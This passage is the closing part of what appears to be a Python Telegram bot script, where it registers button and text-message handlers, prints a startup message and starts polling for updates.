    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Starting Telegram Bot...")
    
    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()